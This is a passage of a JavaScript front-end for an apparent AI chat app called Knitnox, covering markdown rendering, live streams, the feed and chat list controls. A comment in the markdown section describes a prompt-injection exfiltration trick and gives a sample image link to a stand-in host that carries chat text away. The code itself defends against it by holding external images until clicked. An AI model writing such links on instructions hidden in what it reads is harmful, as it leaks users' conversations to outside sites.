// Knitnox front-end.
//   - htmx handles CRUD forms (settings/admin/panel)
//   - this file: markdown + highlighting, sidebar/menus, chat list actions
//     (rename/pin/archive/delete), composer (images + files, paste, drag &
//     drop), live chat over SSE, edit / regenerate, tool approvals, paging,
//     notifications (Web Push), keyboard shortcuts, lightbox.
(() => {
  "use strict";
  const csrf = document.body.dataset.csrf || "";
  const isTouch = matchMedia("(hover: none) and (pointer: coarse)").matches;
  const $ = (sel, root = document) => root.querySelector(sel);
  const $$ = (sel, root = document) => [...root.querySelectorAll(sel)];

  // ================================================================ helpers
  let flashTimer;
  const flashEl = $("#flash");
  function flash(msg) {
    flashEl.textContent = msg;
    clearTimeout(flashTimer);
    flashTimer = setTimeout(() => (flashEl.textContent = ""), 4000);
  }
  new MutationObserver(() => { // htmx also writes errors into #flash
    if (!flashEl.textContent) return;
    clearTimeout(flashTimer);
    flashTimer = setTimeout(() => (flashEl.textContent = ""), 4000);
  }).observe(flashEl, { childList: true, characterData: true, subtree: true });

  function post(url, body) {
    const headers = { "X-CSRF-Token": csrf, "X-Fetch": "1" };
    if (body instanceof FormData) { /* browser sets multipart boundary */ }
    else if (body && body.json) { headers["Content-Type"] = "application/json"; body = JSON.stringify(body.json); }
    else { headers["Content-Type"] = "application/x-www-form-urlencoded"; body = new URLSearchParams(body || {}); }
    return fetch(url, { method: "POST", headers, body });
  }
  async function errorText(r) {
    const t = (await r.text()).trim();
    return t.startsWith("<") ? `Something went wrong (${r.status}).` : t;
  }
  async function copyText(text) {
    try { await navigator.clipboard.writeText(text); return true; }
    catch {
      const ta = Object.assign(document.createElement("textarea"), { value: text });
      document.body.append(ta); ta.select();
      const ok = document.execCommand("copy"); ta.remove(); return ok;
    }
  }
  function autosize(ta, maxRatio = 0.4) {
    ta.style.height = "auto";
    ta.style.height = Math.min(ta.scrollHeight, innerHeight * maxRatio) + "px";
  }
  const fmtBytes = (n) => n >= 1 << 20 ? (n / (1 << 20)).toFixed(1) + " MB" : n >= 1024 ? Math.round(n / 1024) + " KB" : n + " B";
  const ICON_COPY = '<svg class="i" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round"><rect x="8" y="8" width="13" height="13" rx="2"/><path d="M4 16a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2"/></svg>';
  const ICON_CHECK = '<svg class="i" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>';
  const ICON_X = '<svg class="i" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>';
  const ICON_FILE = '<svg class="i" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/></svg>';

  // ---------- coming back to the app ----------
  // A phone freezes a page that is not in front and quietly drops its live
  // connection, while the browser may go on calling it "open". So nothing here
  // trusts that word: every live part catches up when the page is in front
  // again, when the network is back, and when the server has been silent too long.
  const returnFns = [];
  const onReturn = (fn) => returnFns.push(fn); // fn(ms the page was away; 0 = the network came back)
  let hiddenAt = document.hidden ? Date.now() : 0, lastBack = 0;
  function cameBack(away) {
    if (Date.now() - lastBack < 1500) return; // two signals for one return
    lastBack = Date.now();
    for (const fn of returnFns) { try { fn(away); } catch (err) { console.error(err); } }
  }
  document.addEventListener("visibilitychange", () => {
    if (document.hidden) { hiddenAt = Date.now(); return; }
    const away = hiddenAt ? Date.now() - hiddenAt : 0;
    hiddenAt = 0;
    if (away >= 4000) cameBack(away);
  });
  window.addEventListener("online", () => { if (!document.hidden) cameBack(0); });
  window.addEventListener("pageshow", (e) => { if (e.persisted) cameBack(3600e3); }); // shown again from the browser's memory

  // One live connection to the server. onData gets every message; catchUp runs
  // each time the connection is made again, because what was sent in between is lost.
  // The server sends a "ping" every 20 to 25 seconds: a minute of silence means
  // the connection is dead, whatever the browser says.
  function liveStream(url, onData, catchUp) {
    let es = null, heard = 0, first = true;
    const open = () => {
      es?.close();
      const mine = es = new EventSource(url);
      let again = !first;
      first = false;
      heard = Date.now();
      mine.onopen = () => { heard = Date.now(); if (again) catchUp(); again = true; };
      mine.onmessage = (e) => { heard = Date.now(); onData(e); };
      mine.addEventListener("ping", () => { heard = Date.now(); });
      mine.onerror = () => { // the browser tries again by itself, unless the server said no
        if (mine.readyState === EventSource.CLOSED) setTimeout(() => { if (es === mine && !document.hidden) open(); }, 5000);
      };
    };
    open();
    onReturn(open);
    setInterval(() => { if (es && !document.hidden && Date.now() - heard > 60e3) open(); }, 15e3);
    // A browser allows only six connections to one server, and a live stream
    // holds one for as long as it is open. Give it back the moment the page is
    // left, so the next page never waits for it; cameBack takes it again.
    window.addEventListener("pagehide", () => { es?.close(); es = null; });
    // On a phone the connection is given back as soon as the app is not in
    // front. The server takes an open connection as "this person is looking at
    // the page" and sends no notification; a phone would keep a frozen
    // connection open for minutes, and the notification would never come.
    document.addEventListener("visibilitychange", () => {
      if (document.hidden) { if (isTouch) { es?.close(); es = null; } }
      else if (!es) open(); // cameBack did not do it: the app was away only for a moment
    });
    return { reopen: open };
  }

  // A page that shows work done in the background (main[data-fresh]) is loaded
  // again after a longer time away, unless something typed would be lost.
  const freshMain = $("main[data-fresh]");
  if (freshMain) onReturn((away) => {
    if (away < 30e3 || $("dialog[open]") || $(".is-editing")) return;
    for (const f of $$("textarea, input", freshMain)) {
      if (["hidden", "checkbox", "radio", "submit", "button", "file"].includes(f.type)) continue;
      if (f.value !== f.defaultValue) return;
    }
    location.reload();
  });

  // Adding a model by name: show only the boxes that fit what the model is for
  // ("Accepts images" for a chat model, "Voice name" for a voice model).
  document.addEventListener("change", (e) => {
    const pick = e.target.closest?.("[data-kind-pick]");
    if (!pick) return;
    for (const el of $$("[data-kind-only]", pick.form)) el.hidden = el.dataset.kindOnly !== pick.value;
  });

  // CSP forbids inline styles, so meters get their width here.
  function applyMeters(root) {
    for (const el of $$("[data-pct]", root)) {
      if (el.classList.contains("ctx")) continue;
      el.style.width = Math.max(0, Math.min(100, Number(el.dataset.pct))) + "%";
    }
  }

  // ===================================================== markdown + code
  if (window.DOMPurify) {
    // A picture from another site is not loaded by itself. Loading it tells that
    // site something, and text the AI was fed (a web page, a file, a tool result)
    // can make it write a picture address that carries your data away, like
    // ![](https://somewhere.example/?q=what-you-said). The address is kept aside
    // and renderMD puts a button in its place; the picture loads on a click.
    const ownPicture = (src) => /^(\/(?!\/)|data:image\/|blob:)/i.test(src);
    DOMPurify.addHook("afterSanitizeAttributes", (n) => {
      if (n.tagName === "IMG") {
        n.removeAttribute("srcset");
        const src = n.getAttribute("src") || "";
        if (src && !ownPicture(src)) { n.setAttribute("data-held-src", src); n.removeAttribute("src"); }
        return;
      }
      if (n.tagName !== "A") return;
      const href = n.getAttribute("href") || "";
      if (href.startsWith("/") && !href.startsWith("//")) return; // links inside Knitnox stay in this tab
      n.setAttribute("target", "_blank"); n.setAttribute("rel", "noopener noreferrer");
    });
  }
  if (window.hljs) hljs.configure({ ignoreUnescapedHTML: true });

  const langOf = (code) => (/language-([\w+#.-]+)/.exec(code.className) || [])[1];
  // Highlights a <code>. Labelled fences use their language; unlabelled ones
  // are auto-detected (short snippets are left alone to avoid wild guesses).
  // Returns the language that was used, or "".
  function highlight(code) {
    if (!window.hljs) return "";
    const lang = langOf(code);
    if (lang && hljs.getLanguage(lang)) {
      delete code.dataset.highlighted;
      hljs.highlightElement(code);
      return lang;
    }
    const text = code.textContent;
    if (lang || text.length < 24 || text.length > 50000) return lang || "";
    const res = hljs.highlightAuto(text);
    if (!res.language || res.relevance < 5) return "";
    code.innerHTML = res.value;
    code.classList.add("hljs", "language-" + res.language);
    return res.language;
  }
  function codeBox(pre, label) {
    const box = document.createElement("div");
    box.className = "codeblock";
    box.innerHTML = `<div class="code-head"><span></span><button type="button" data-copy-code aria-label="Copy code">${ICON_COPY}<span>Copy</span></button></div>`;
    box.querySelector(".code-head > span").textContent = label || "text";
    pre.replaceWith(box);
    box.append(pre);
    return box;
  }
  function enhanceCode(root) {
    for (const code of $$("pre > code", root)) {
      const pre = code.parentElement;
      if (pre.parentElement.classList.contains("codeblock")) continue;
      const box = codeBox(pre, langOf(code));
      const used = highlight(code);
      if (used) box.querySelector(".code-head > span").textContent = used;
    }
  }
  // A small floating Copy button for code that isn't a full code block
  // (tool arguments and results, approval cards).
  function addPreCopy(root) {
    for (const pre of $$(".tool pre, .approval pre", root)) {
      if (pre.classList.contains("copyable")) continue;
      pre.classList.add("copyable");
      const b = document.createElement("button");
      b.type = "button"; b.className = "pre-copy"; b.dataset.copyPre = "";
      b.setAttribute("aria-label", "Copy");
      b.innerHTML = `${ICON_COPY}<span>Copy</span>`;
      pre.append(b);
    }
  }
  // User messages stay plain text, except ``` fences become real code blocks.
  const FENCE = /```([\w+#.-]*)[^\n]*\n([\s\S]*?)(?:```|$)/g;
  function renderBubble(el) {
    if (el._raw !== undefined) return;
    const raw = el.textContent;
    el._raw = raw;
    if (!raw.includes("```")) return;
    el.textContent = "";
    let last = 0;
    for (const m of raw.matchAll(FENCE)) {
      if (m.index > last) el.append(raw.slice(last, m.index).replace(/^\n+|\n+$/g, ""));
      const pre = document.createElement("pre");
      const code = document.createElement("code");
      if (m[1]) code.className = "language-" + m[1];
      code.textContent = m[2].replace(/\n$/, "");
      pre.append(code);
      el.append(pre);
      const box = codeBox(pre, m[1]);
      const used = highlight(code);
      if (used) box.querySelector(".code-head > span").textContent = used;
      last = m.index + m[0].length;
    }
    if (last < raw.length) el.append(raw.slice(last).replace(/^\n+/, ""));
  }
  const bubbleText = (b) => b ? (b._raw ?? b.textContent) : "";
  function flashCopied(btn, label = true) {
    btn.classList.add("is-copied");
    btn.innerHTML = `${ICON_CHECK}${label ? "<span>Copied</span>" : ""}`;
    setTimeout(() => { btn.classList.remove("is-copied"); btn.innerHTML = `${ICON_COPY}${label ? "<span>Copy</span>" : ""}`; }, 1600);
  }
  // Pictures from other sites the reader chose to show stay shown while the
  // page is open (an answer is drawn again many times while it streams).
  const shownPictures = new Set();
  function showHeld(btn, src, alt) {
    const img = document.createElement("img");
    img.src = src; img.alt = alt || ""; img.loading = "lazy"; img.referrerPolicy = "no-referrer";
    btn.replaceChildren(img);
  }
  document.addEventListener("click", (e) => {
    const btn = e.target.closest?.("button.held-img[data-held-src]");
    if (!btn) return;
    shownPictures.add(btn.dataset.heldSrc);
    const holder = document.createElement("span");
    showHeld(holder, btn.dataset.heldSrc, btn.dataset.alt);
    btn.replaceWith(holder.firstChild);
  });
  // Draws markdown into el. An answer is drawn many times while it is written,
  // so the text is cut into its top-level parts (a paragraph, a list, a code
  // block…) and only the parts that changed are drawn again, normally just the
  // last one. What is already on the screen stays untouched: no flicker, a
  // selection survives, and a phone has little to do.
  const MD_OPTS = { gfm: true, breaks: true };
  function mdParts(raw) {
    try {
      const tokens = marked.lexer(raw, MD_OPTS);
      // Raw HTML can open in one part and close in a later one, and a link
      // defined at the bottom changes parts above it: both are drawn as a whole.
      if (!tokens.some((t) => t.type === "html") && !Object.keys(tokens.links || {}).length) {
        return tokens.filter((t) => t.type !== "space").map((t) => ({ raw: t.raw, html: () => marked.parser([t], MD_OPTS) }));
      }
    } catch { /* fall through: draw it whole */ }
    return [{ raw: "\u0000" + raw, html: () => marked.parse(raw, MD_OPTS) }];
  }
  // fade: the answer is being written right now, so words that were not on the
  // screen before come in softly (see fadeNew).
  function renderMD(el, raw, fade) {
    if (el._raw === raw && el._parts) return;
    el._raw = raw;
    if (!(window.marked && window.DOMPurify)) { el.textContent = raw; return; }
    const parts = mdParts(raw), old = el._parts || [];
    if (!el._parts) el.textContent = ""; // the server's plain text
    let keep = 0;
    while (keep < old.length && keep < parts.length && old[keep].raw === parts[keep].raw) keep++;
    // How many letters were on the screen, and how many of them stay as they are.
    let marks = null, at = 0;
    const now = performance.now();
    if (fade) {
      let shown = 0;
      old.forEach((p, i) => { shown += partLen(p); if (i < keep) at = shown; });
      marks = (el._marks || []).filter((m) => now - m.t < FADE_MS && m.pos < shown);
      marks.push({ pos: shown, t: now });
      el._marks = marks;
    }
    for (const p of old.slice(keep)) for (const n of p.nodes) n.remove();
    const done = old.slice(0, keep);
    for (const p of parts.slice(keep)) {
      const box = document.createElement("div");
      box.innerHTML = DOMPurify.sanitize(p.html(), { FORBID_ATTR: ["style", "background", "poster"] });
      dressMD(box);
      const part = { raw: p.raw, nodes: null, len: undefined };
      if (marks) {
        const texts = textNodes([box]);
        part.len = texts.reduce((n, t) => n + t.data.length, 0);
        fadeNew(texts, at, marks, now);
        at += part.len;
      }
      part.nodes = [...box.childNodes];
      el.append(...part.nodes);
      done.push(part);
    }
    el._parts = done;
  }
  // The text of some drawn nodes, piece by piece, without the bar above a code block.
  function textNodes(nodes) {
    const out = [];
    for (const n of nodes) {
      if (n.nodeType === 3) { out.push(n); continue; }
      if (n.nodeType !== 1) continue;
      const walk = document.createTreeWalker(n, NodeFilter.SHOW_ELEMENT | NodeFilter.SHOW_TEXT, {
        acceptNode: (x) => x.nodeType === 3 ? NodeFilter.FILTER_ACCEPT : x.classList.contains("code-head") ? NodeFilter.FILTER_REJECT : NodeFilter.FILTER_SKIP,
      });
      while (walk.nextNode()) out.push(walk.currentNode);
    }
    return out;
  }
  const partLen = (p) => p.len ?? (p.len = textNodes(p.nodes).reduce((n, t) => n + t.data.length, 0));
  // Words that are new since the last drawing fade in. The part that is still
  // being written is drawn again about ten times a second, so "new" cannot mean
  // "drawn just now": that would make the whole paragraph blink. Instead the
  // letters are counted. marks says at which letter each of the last drawings
  // began and when; text after such a letter is wrapped in a span whose fade is
  // already as far along as its age, so a word fades once, across drawings.
  const FADE_MS = 320; // the same time as .fresh in style.css
  function fadeNew(texts, at, marks, now) {
    for (const t of texts) {
      const from = at, s = t.data;
      at += s.length;
      if (at <= marks[0].pos || !s.trim()) continue; // on the screen before, or only spacing (which must stay bare inside a table)
      const cuts = [0, ...marks.map((m) => m.pos - from).filter((c) => c > 0 && c < s.length), s.length];
      const pieces = document.createDocumentFragment();
      for (let i = 0; i + 1 < cuts.length; i++) {
        const text = s.slice(cuts[i], cuts[i + 1]);
        const mark = marks.findLast((m) => m.pos <= from + cuts[i]);
        if (!mark) { pieces.append(text); continue; }
        const span = document.createElement("span");
        span.className = "fresh";
        span.style.animationDelay = `${Math.round(mark.t - now)}ms`; // minus its age
        span.textContent = text;
        pieces.append(span);
      }
      t.replaceWith(pieces);
    }
  }
  function dressMD(el) {
    for (const img of $$("img[data-held-src]", el)) { // pictures from other sites wait for a click
      const src = img.dataset.heldSrc;
      let host = "another site";
      try { host = new URL(src).hostname || host; } catch { /* not an address: the button says so */ }
      const btn = document.createElement("button");
      btn.type = "button";
      btn.className = "held-img";
      if (shownPictures.has(src)) { showHeld(btn, src, img.alt); img.replaceWith(btn.firstChild || btn); continue; }
      btn.dataset.heldSrc = src;
      btn.dataset.alt = img.alt || "";
      btn.title = src;
      btn.textContent = `Show picture from ${host}`;
      img.replaceWith(btn);
    }
    enhanceCode(el);
    for (const table of $$("table", el)) { // wide tables scroll instead of breaking the layout
      if (table.parentElement.classList.contains("table-wrap")) continue;
      const wrap = document.createElement("div");
      wrap.className = "table-wrap";
      table.replaceWith(wrap);
      wrap.append(table);
    }
  }
  // The server sends markdown source as escaped text; render it once.
  function renderAll(root) {
    for (const el of $$(".md", root)) if (el._raw === undefined) renderMD(el, el.textContent);
    for (const el of $$(".bubble", root)) renderBubble(el);
    for (const code of $$(".tool code[class*=language-], .approval code[class*=language-]", root)) {
      if (code.dataset.pretty) continue;
      code.dataset.pretty = "1";
      try { code.textContent = JSON.stringify(JSON.parse(code.textContent), null, 2); } catch { /* keep */ }
      highlight(code);
    }
    addPreCopy(root);
    applyMeters(root);
  }

  // ===================================================== global UI
  const body = document.body;

  // ---------- time zone: tell the server the device's zone so the AI knows the user's date and time ----------
  const deviceTZ = (() => { try { return Intl.DateTimeFormat().resolvedOptions().timeZone || ""; } catch { return ""; } })();
  if (csrf && deviceTZ && body.dataset.tzAuto === "true" && body.dataset.tz !== deviceTZ) {
    post("/settings/timezone", { tz: deviceTZ, auto: "1" }).then((r) => {
      if (!r.ok) return;
      body.dataset.tz = deviceTZ;
      const input = $("#tz-input");
      if (input && !input.value) input.value = deviceTZ;
      const told = $("#tz-now"); // Settings → Account was rendered before the zone was known
      if (told) {
        const now = new Date(), o = { timeZone: deviceTZ };
        told.textContent = `${now.toLocaleTimeString("en-GB", { ...o, hour: "2-digit", minute: "2-digit" })} on ${now.toLocaleDateString("en-GB", { ...o, weekday: "long", day: "numeric", month: "long" })}`;
      }
    }).catch(() => { /* try again on the next page */ });
  }
  const tzList = $("#tz-list"); // Settings → Account: suggestions for the time zone box
  if (tzList && Intl.supportedValuesOf) {
    for (const zone of Intl.supportedValuesOf("timeZone")) tzList.append(Object.assign(document.createElement("option"), { value: zone }));
  }
  const setSidebar = (open) => body.classList.toggle("sidebar-open", open);
  const panel = $("#panel"), panelScrim = $(".panel-scrim");
  const closePanel = () => { if (panel) panel.hidden = true; if (panelScrim) panelScrim.hidden = true; };
  const MENUS = "details.user-menu, details.row-menu, details.sb-menu, details.tip";
  const closeMenus = (except) => { for (const d of $$(MENUS)) if (d.open && d !== except) d.open = false; };
  const lightbox = $("#lightbox");
  // On a phone a menu is a sheet over the page; its bar has a cross to close it.
  document.addEventListener("click", (e) => {
    const x = e.target.closest("[data-close-menu]");
    if (!x) return;
    e.preventDefault();
    const menu = x.closest("details");
    if (menu) { menu.open = false; menu.querySelector("summary")?.focus(); }
  });

  document.addEventListener("htmx:afterSwap", (e) => {
    renderAll(e.target);
    if (panel && e.target === panel) { panel.hidden = false; panelScrim.hidden = false; }
  });
  // A box marked data-same-as="other" must hold the same text as that other box
  // (typing a new password twice). The browser then shows the message itself.
  document.addEventListener("input", (e) => {
    const form = e.target.form;
    if (!form) return;
    for (const el of form.querySelectorAll("[data-same-as]")) {
      const other = form.elements[el.dataset.sameAs];
      el.setCustomValidity(other && el.value && other.value !== el.value ? "The two passwords are not the same." : "");
    }
  });
  document.addEventListener("htmx:afterRequest", (e) => {
    const form = e.target.closest?.("form[data-reset]");
    if (form && e.detail.successful && e.detail.elt === form) { form.reset(); $("[data-refocus]", form)?.focus(); } // ready for the next one
  });

  // ---------- Plan Book: example tasks fill the box; "Pick a date…" opens the calendar ----------
  document.addEventListener("click", (e) => {
    const fill = e.target.closest("[data-plan-fill]"), box = $("#plan-title");
    if (fill && box) { box.value = fill.dataset.planFill; box.focus(); }
  });
  // The add box is one line. Its choices (when, project, note) open once you use it and stay open while you
  // choose; they close again when you click elsewhere with nothing typed.
  document.addEventListener("focusin", (e) => e.target.closest?.(".plan-add")?.classList.add("is-open"));
  document.addEventListener("click", (e) => {
    const form = $(".plan-add.is-open");
    if (form && !form.contains(e.target) && !e.target.closest("[data-plan-fill]") && !("keepOpen" in form.dataset) && !$("#plan-title").value.trim()) form.classList.remove("is-open");
  });
  // The "Added … / Undo" bar comes back with the list after each change. It goes away by itself after a
  // few seconds, but waits while the pointer is on it or its button has focus, so Undo stays in reach.
  function dismissPlanUndo(root) {
    const dock = root.querySelector?.(".plan-undo-dock") || (root.matches?.(".plan-undo-dock") && root);
    if (!dock || dock.dataset.timed) return;
    dock.dataset.timed = "1";
    let timer;
    const start = () => { clearTimeout(timer); timer = setTimeout(() => {
      if (dock.matches(":hover") || dock.contains(document.activeElement)) { start(); return; }
      dock.classList.add("is-leaving");
      setTimeout(() => dock.remove(), 250);
    }, 6000); };
    dock.addEventListener("pointerenter", () => clearTimeout(timer));
    dock.addEventListener("pointerleave", start);
    dock.addEventListener("focusout", (e) => { if (!dock.contains(e.relatedTarget)) start(); });
    start();
  }
  document.addEventListener("htmx:afterSwap", (e) => dismissPlanUndo(e.target));
  dismissPlanUndo(document);
  document.addEventListener("change", (e) => {
    if (!e.target.matches?.("[data-plan-pick]")) return;
    const date = $(".plan-date", e.target.form);
    date.focus();
    try { date.showPicker(); } catch { /* typing the date works too */ }
  });
  // ---------- a button that opens and closes a part of the page: <button data-toggle="#id"> ----------
  document.addEventListener("click", (e) => {
    const btn = e.target.closest("[data-toggle]");
    const box = btn && $(btn.dataset.toggle);
    if (!box) return;
    box.hidden = !box.hidden;
    for (const b of $$(`[data-toggle="${btn.dataset.toggle}"][aria-expanded]`)) b.setAttribute("aria-expanded", String(!box.hidden));
    if (!box.hidden) { $("textarea, input:not([type=hidden])", box)?.focus(); box.scrollIntoView({ block: "nearest" }); }
  });

  // ---------- Feed: say that new posts arrived instead of pushing them into what is being read ----------
  const feedList = $("#feed-list"), feedNew = $("#feed-new");
  if (feedList?.dataset.live && feedNew && window.EventSource) {
    const scroller = feedList.closest(".page-scroll");
    const topID = () => Math.max(0, ...$$("[data-post]", feedList).map((el) => Number(el.dataset.post) || 0));
    const address = (what) => `/feed/${what}?after=${topID()}${feedList.dataset.q ? "&" + feedList.dataset.q : ""}`;
    const load = () => {
      feedNew.hidden = true;
      if (window.htmx) htmx.ajax("GET", address("new"), { target: "#feed-list", swap: "afterbegin" });
    };
    const check = async () => {
      let n = 0;
      try { n = (await (await fetch(address("count"), { headers: { "X-Fetch": "1" } })).json()).n || 0; } catch { return; }
      feedNew.hidden = n === 0;
      if (n === 0) return;
      $("span", feedNew).textContent = n === 1 ? "1 new post" : `${n} new posts`;
      // At the very top nothing is being read yet, so the posts can simply appear.
      if (scroller.scrollTop < 40 && !$(".is-editing", feedList) && !feedList.contains(document.activeElement)) load();
    };
    feedNew.addEventListener("click", () => { load(); scroller.scrollTo({ top: 0, behavior: "smooth" }); });
    let feedTimer;
    liveStream("/feed/events", (e) => {
      let data = {};
      try { data = JSON.parse(e.data).data || {}; } catch { /* a plain nudge */ }
      if (data.changed) { // a picture, recording or video is ready: show it on its post, if that post is on the page
        const card = $(`#fp-${Number(data.id)}`);
        if (card && !card.classList.contains("is-editing") && window.htmx) htmx.ajax("GET", `/feed/p/${Number(data.id)}`, { target: card, swap: "outerHTML" });
        return;
      }
      // Wait a moment: a post written on this page is already in the list by then.
      clearTimeout(feedTimer); feedTimer = setTimeout(check, 700);
    }, check);
    document.addEventListener("visibilitychange", () => { if (!document.hidden) check(); }); // catch up after the tab was away
  }

  // ---------- Feed: post times stay true ("5 min ago" moves on by itself) ----------
  // Same words as the server writes (feedWhen), in the time zone the server used.
  if (feedList) {
    let zone = feedList.dataset.tz || undefined;
    try { new Intl.DateTimeFormat("en-GB", { timeZone: zone }); } catch { zone = undefined; }
    const fmt = (opts) => new Intl.DateTimeFormat("en-GB", { timeZone: zone, hourCycle: "h23", ...opts });
    const ymd = fmt({ year: "numeric", month: "numeric", day: "numeric" });
    const clock = fmt({ hour: "2-digit", minute: "2-digit" }), weekday = fmt({ weekday: "short" });
    const dayMonth = fmt({ day: "numeric", month: "short" }), dayMonthYear = fmt({ day: "numeric", month: "short", year: "numeric" });
    const dayNo = (d) => { // days since 1970 of the calendar day in that zone
      const p = Object.fromEntries(ymd.formatToParts(d).map((x) => [x.type, Number(x.value)]));
      return [Math.round(Date.UTC(p.year, p.month - 1, p.day) / 864e5), p.year];
    };
    const words = (t, now) => {
      const ago = now - t;
      if (ago < 60e3) return "just now";
      if (ago < 3600e3) return `${Math.floor(ago / 60e3)} min ago`;
      const [day, year] = dayNo(t), [today, thisYear] = dayNo(now);
      if (day === today) return `Today ${clock.format(t)}`;
      if (today - day === 1) return `Yesterday ${clock.format(t)}`;
      if (today - day < 7) return `${weekday.format(t)} ${clock.format(t)}`;
      return year === thisYear ? dayMonth.format(t) : dayMonthYear.format(t);
    };
    const tick = () => {
      const now = new Date();
      for (const el of $$("time[data-when]", feedList)) {
        const t = new Date(el.dateTime);
        if (isNaN(t)) continue;
        const text = words(t, now);
        if (el.textContent !== text) el.textContent = text;
      }
    };
    setInterval(tick, 30e3);
    document.addEventListener("visibilitychange", () => { if (!document.hidden) tick(); });
  }

  // ---------- Feed: a photo or drawing of your own on a new post ----------
  const feedAdd = $("#add.feed-add"), ownFile = feedAdd && $("[data-own-file]", feedAdd);
  if (ownFile) {
    const shown = $("[data-own-shown]", feedAdd), text = $("[data-own-text]", feedAdd);
    const isPicture = (f) => /^image\/(png|jpeg|webp|gif|svg\+xml)$/.test(f.type) || /\.svg$/i.test(f.name);
    let address = "";
    const show = () => {
      const f = ownFile.files[0];
      if (address) { URL.revokeObjectURL(address); address = ""; }
      if (f && (!isPicture(f) || f.size > 10 * 1024 * 1024)) {
        ownFile.value = "";
        flash(isPicture(f) ? "That picture is larger than 10 MB." : "Choose a PNG, JPEG, WebP or GIF photo, or an SVG drawing.");
        return show();
      }
      const svg = !!f && (f.type === "image/svg+xml" || /\.svg$/i.test(f.name));
      shown.hidden = !f;
      feedAdd.classList.toggle("has-own", !!f);
      feedAdd.classList.toggle("has-photo", !!f && !svg); // a photo takes the place of what AI would add
      if (text) text.required = !f; // a picture can stand by itself
      if (!f) { $("img", shown).removeAttribute("src"); return; }
      if (!svg) for (const r of $$("[name=media]", feedAdd)) r.checked = r.value === "";
      address = URL.createObjectURL(f);
      $("img", shown).src = address;
      $(".feed-own-name", shown).textContent = f.name;
    };
    ownFile.addEventListener("change", show);
    $("[data-own-pick]", feedAdd).addEventListener("click", () => ownFile.click());
    $("[data-own-clear]", feedAdd).addEventListener("click", () => { ownFile.value = ""; show(); });
    feedAdd.addEventListener("reset", () => setTimeout(show)); // after a post went out
    const take = (files) => { // pasted or dropped
      const f = [...(files || [])].find(isPicture);
      if (!f) return false;
      const dt = new DataTransfer();
      dt.items.add(f);
      ownFile.files = dt.files;
      show();
      return true;
    };
    feedAdd.addEventListener("paste", (e) => { if (take(e.clipboardData?.files)) e.preventDefault(); });
    feedAdd.addEventListener("dragover", (e) => { if ([...(e.dataTransfer?.types || [])].includes("Files")) e.preventDefault(); });
    feedAdd.addEventListener("drop", (e) => { if (take(e.dataTransfer?.files)) e.preventDefault(); });
  }

  document.addEventListener("htmx:beforeRequest", (e) => { // panel button toggles
    if (e.target.id === "panel-toggle" && panel && !panel.hidden) { closePanel(); e.preventDefault(); }
  });

  // ---------- chat list actions: rename / pin / archive / delete / leave ----------
  function startRename(id) {
    closeMenus();
    const row = $(`[data-thread-row="${id}"]`);
    const titleEl = row ? $(".sb-title", row) : null;
    const topTitle = $("#thread-title");
    const current = row?.dataset.title ?? topTitle?.textContent ?? "";
    // Inline in the sidebar when the row exists, otherwise in the top bar.
    const host = titleEl || topTitle;
    if (!host) return;
    const input = Object.assign(document.createElement("input"), { value: current, className: "rename-input", maxLength: 80, "aria-label": "New title" });
    host.replaceWith(input);
    input.focus(); input.select();
    let done = false;
    const finish = async (save) => {
      if (done) return; done = true;
      let title = current;
      if (save && input.value.trim() && input.value.trim() !== current) {
        const r = await post(`/t/${id}/rename`, { title: input.value.trim() });
        if (r.ok) title = await r.text(); else flash(await errorText(r));
      }
      host.textContent = title;
      input.replaceWith(host);
      if (row) row.dataset.title = title;
      if (topTitle && String($("#chat")?.dataset.thread) === String(id)) { topTitle.textContent = title; document.title = `${title} · Knitnox`; }
      if (row && titleEl) titleEl.textContent = title;
    };
    input.addEventListener("keydown", (e) => {
      if (e.key === "Enter") { e.preventDefault(); finish(true); }
      if (e.key === "Escape") { e.preventDefault(); finish(false); }
      e.stopPropagation();
    });
    input.addEventListener("blur", () => finish(true));
    input.addEventListener("click", (e) => e.preventDefault());
  }

  document.addEventListener("click", async (e) => {
    const t = e.target;
    if (t.closest("[data-toggle-sidebar]")) setSidebar(!body.classList.contains("sidebar-open"));
    if (t.closest("[data-close-sidebar]") || t.closest("a.sb-item")) setSidebar(false);
    if (t.closest("[data-close-panel]")) closePanel();
    // one open menu at a time; close when clicking elsewhere
    const openedMenu = t.closest(MENUS);
    closeMenus(openedMenu);
    if (t.closest("[data-open-palette]")) { setSidebar(false); openPalette(); }
    else if (palette && !palette.hidden && !t.closest(".palette-box")) closePalette();

    // appearance: theme and accent colour, remembered in this browser
    const themeBtn = t.closest("[data-theme-set]"), accentBtn = t.closest("[data-accent-set]");
    if (themeBtn) setLook("theme", themeBtn.dataset.themeSet);
    if (accentBtn) setLook("accent", accentBtn.dataset.accentSet);

    // home: hide the getting-started list for good
    if (t.closest("[data-hide-start]")) { setCookie("kn_start", "off"); $("#start")?.remove(); }

    // agent panel tabs
    const tabBtn = t.closest("[data-tab-btn]");
    if (tabBtn && panel) showTab(tabBtn.dataset.tabBtn);

    // "start from an example": fill the form the button sits in
    const fill = t.closest("[data-fill]");
    if (fill) {
      const form = fill.closest("form");
      for (const [name, value] of Object.entries(JSON.parse(fill.dataset.fill))) {
        const field = form.elements[name];
        if (field) field.value = value;
      }
      form.elements.name?.focus();
      flash("Example filled in. Change anything, then create the agent.");
    }

    const copy = t.closest("[data-copy]");
    if (copy && await copyText(copy.dataset.copy)) flash("Link copied");

    const copyCode = t.closest("[data-copy-code]");
    if (copyCode) {
      e.preventDefault(); // code blocks can sit inside <summary>/<a>
      const code = copyCode.closest(".codeblock").querySelector("pre");
      if (await copyText(code.textContent.replace(/\n$/, ""))) flashCopied(copyCode);
      else flash("Couldn't copy. Select the text instead.");
    }
    const copyPre = t.closest("[data-copy-pre]");
    if (copyPre) {
      e.preventDefault();
      const pre = copyPre.closest("pre");
      const text = [...pre.childNodes].filter((n) => n !== copyPre).map((n) => n.textContent).join("");
